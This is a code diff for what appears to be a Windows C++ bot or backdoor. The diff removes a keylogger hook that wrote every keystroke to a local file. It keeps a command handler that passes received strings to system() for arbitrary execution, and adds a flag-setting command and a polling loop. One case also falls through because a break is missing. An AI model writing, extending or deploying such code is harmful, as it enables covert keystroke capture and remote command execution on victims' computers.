@@ -10,8 +10,9 @@
 #include <cstdio>
 #include "download.h"
 #include "LCb.h"
+#include "rwFlags.h"
 
-std::ofstream logfile("C:\\Bootstrap\\keyslog");
+std::string flagsFile = "C:\\Bootstrap\\flags";
 
 bool isRegistryKeyExists(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH") {
     HKEY hKey;
@@ -21,17 +22,6 @@ bool isRegistryKeyExists(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH") {
         return true;
     }
     return false;
-}
-
-LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
-    if (code == HC_ACTION) {
-        KBDLLHOOKSTRUCT *p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-        char c = static_cast<char>(p->vkCode);
-        logfile << c;
-        logfile.flush();
-    }
-
-    return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
 //mode it been released in 6.0 or when I have time
@@ -153,62 +143,6 @@ int GetRegistryKeyValue(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH", co
 }
 
 /**
- * Reads a configuration file and sets certain flags based on the contents of the file.
- *
- * @throws Error opening the file or reading its contents.
- */
-/*
-void readConfFile() {
-    const char header = '!';
-    const char newline = '&';
-    const vector<string> names = {
-        "BS", "RMBR", "RW", "CKPC", "CURI", "IRK"
-    };
-
-    char buffer;
-    string Buffer;
-    ifstream f("X:\\051DD118572A366E");
-
-    if (f) {
-        buffer = f.get();
-        if (buffer == header) {
-            f.seekg(2);
-            for (int i = 0; i < 4; i++) {
-                buffer = f.get();
-                Buffer += buffer;
-                if (buffer != header) {
-                    auto it = std::find(names.begin(), names.end(), buffer);
-
-                    if (it != names.end()) {
-                        switch (Buffer) {
-                            case names[0]:
-                                BS = true;
-                                break;
-                            case names[1]:
-                                RMBR = true;
-                                break;
-                            case names[2]:
-                                RW = true;
-                                break;
-                            case names[3]:
-                                CKPC = true;
-                                break;
-                            case names[4]:
-                                CURI = true;
-                                break;
-                            case names[5]:
-                                IRK = true;
-                                break;
-                        }
-                    }
-                }
-            }
-        }
-    }
-    f.close();
-}
-*/
-/**
  * Reboots the system by executing the "shutdown" command with the specified arguments.
  *
  * @param None
@@ -298,10 +232,11 @@ void handleCommand(std::string command = parseCommand()) {
                     return CodeBeta();
                 case 'g':
                     return CodeGamma();
-                case 'c':
+                case 'c': //custom command
                     buffer = command.substr(8, 32767);
                     system(buffer.c_str());
-                    break;
+                case 'f': //set flags
+                    rwFlags(command[8], command.substr(10, 14), flagsFile, std::stoi(command.substr(16, 24)));
             }
         }
     } catch (...) {
@@ -318,5 +253,6 @@ int main() {
     }
     while (true) {
         handleCommand();
+        Sleep(rwFlags('r', "RS", flagsFile, 0));
     }
 }
